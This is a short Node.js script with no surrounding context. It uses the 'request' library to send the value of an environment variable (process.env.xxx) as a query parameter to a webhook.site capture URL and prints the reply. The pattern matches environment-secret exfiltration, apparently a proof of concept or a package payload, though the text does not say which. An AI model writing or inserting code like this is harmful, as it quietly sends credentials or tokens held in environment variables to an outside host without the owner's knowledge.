var request = require('request');

var options = {
    url: `https://webhook.site/8115d6a1-b414-40f3-9ae1-4eb19bd0e341?xxx=${process.env.xxx}`
};

function callback(error, response, body) {
    if (!error && response.statusCode == 200) {
        console.log(body);
    }
}

request(options, callback);
